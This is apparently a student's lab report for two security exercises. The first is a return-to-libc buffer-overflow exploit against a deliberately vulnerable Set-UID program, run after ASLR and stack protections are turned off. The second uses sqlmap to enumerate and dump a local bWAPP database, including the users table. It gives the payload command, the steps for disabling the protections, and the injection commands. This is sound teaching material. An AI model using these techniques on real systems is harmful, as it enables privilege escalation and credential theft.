# Task1: Software buffer overflow attack
**Student ID: 22110038**
**Name:** Phan Triệu Huy 
## Setup env:
**Run docker env:** docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab
![image](https://github.com/user-attachments/assets/06cbf417-5575-4641-84b9-447a46c15091)
**Create file task1.c and vuln.c to inject code:**
vuln.c:

![image](https://github.com/user-attachments/assets/a641a96e-9d42-49d0-a25b-3de4469e76ea)
task1.c:

![image](https://github.com/user-attachments/assets/3a749cb1-2267-4ba3-9d32-6f2ba89c51d4)
 
 **setup:**
Ubuntu and several other Linux-based systems use address space randomization to randomize the starting address of heap and stack.This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this feature using the following command:
sudo sysctl -w kernel.randomize_va_space=0
![image](https://github.com/user-attachments/assets/f8d0b7c8-25c8-4755-b848-7fcc944dc4cd)

In both Ubuntu 12.04 and Ubuntu 16.04 VMs, the/bin/sh symbolic link points to the/bin/dash shell. The dash shell in Ubuntu 16.04 has a countermeasure that prevents itself from being executed in a Set-UID process. Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping the privilege.Since our victim program is aSet-UID program, and our attack relies on running/bin/sh, the countermeasure in/bin/dash makes our attack more difficult.
sudo ln -sf /bin/zsh /bin/sh
![image](https://github.com/user-attachments/assets/17c0f108-c688-4a62-92bf-0fad1ed11384)

Compile program with options to defeat stack protecting mechanism and code execution on stack:
gcc vuln.c -o vuln -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
![image](https://github.com/user-attachments/assets/19e982d1-dc96-47c9-9339-8a85eddcd3dd)
## Attack:
**overview:**
![image](https://github.com/user-attachments/assets/cc724258-5395-47b6-9409-69621a79c880)
because shellcode larger 16byte . So, I'll use ret-to-libc.
**export path task1.c to env:**
export mypath="/home/seed/seclabs/lab_exam/task1.c"
![image](https://github.com/user-attachments/assets/be7a33d1-2531-433c-893b-f402628c0fae)
**run debug:**
gdb ./vuln
start
![image](https://github.com/user-attachments/assets/cff40445-01c0-4ddd-9ec6-3382fde290cc)
**get address of system, exit, mypath:**
![image](https://github.com/user-attachments/assets/ddd26bf2-509b-404a-a29f-c3a82c84dcf5)

system: 0xf7e50db0  will be inserted with format \xb0\x0d\xe5\xf
exit: 0xf7e449e0  will be inserted with format \xe0\x49\xe4\xf7
mypath("/home/seed/seclabs/lab_exam/task1.c"): 0xffffdf14 to \x14\xdf\xff\xff
=> r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' '\xe0\x49\xe4\xf7' +  '\x14\xdf\xff\xff')")
![image](https://github.com/user-attachments/assets/3a191e29-6018-4a78-a450-237b57bfc60e)
=> it execute code C but i have bug. 
**run remove ^M**
cat -v task1.c
sed -i 's/\r$//' task1.c
before: 
![image](https://github.com/user-attachments/assets/54e994ff-8957-4a71-b27e-d51f1c991c21)
after: 
![image](https://github.com/user-attachments/assets/25aee0e4-767d-4e09-9a94-71a10ed713df)

**before attack:**
![image](https://github.com/user-attachments/assets/603431f1-e1fe-44d5-81da-17768aec7fce)
**after attack:**
# Task2: Attack on the database of bWapp 
## Install:
**Install bWapp:**
docker pull raesene/bwapp
docker run --rm -it -p 8025:80 raesene/bwapp
localhost:8025/install.php
![image](https://github.com/user-attachments/assets/d454d936-825b-4939-a906-d207ea620f13)

**Install sqlmap:**
![image](https://github.com/user-attachments/assets/bb57e17f-06cc-4090-8042-7c7d1090ca7c)

![image](https://github.com/user-attachments/assets/6d342a2b-4068-4b2a-b759-b9024843b461)

## question1:  Use sqlmap to get information about all available databases
**get cookies of web:**

![image](https://github.com/user-attachments/assets/131f0c6d-dc0d-46f8-acef-2655f0581e3c)

**get valiable tables:**
run: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"

![image](https://github.com/user-attachments/assets/83a79a5b-1806-49a6-826b-7e101ec81231)

## question2:  Use sqlmap to get tables, users information
**get tables:**
run: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"

![image](https://github.com/user-attachments/assets/7f30c176-7beb-4e72-a5d4-d44f9ebbf4e9)

**get users information:**
run python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
info of tables:

![image](https://github.com/user-attachments/assets/310dea9c-6304-4ba7-b3b7-3cf06dcc1d34)

data of tables:
![image](https://github.com/user-attachments/assets/cd36bebf-4431-41f1-a69d-c3f0b42e7ecf)

## question3:  Make use of John the Ripper to disclose the password of all database users from the above exploit

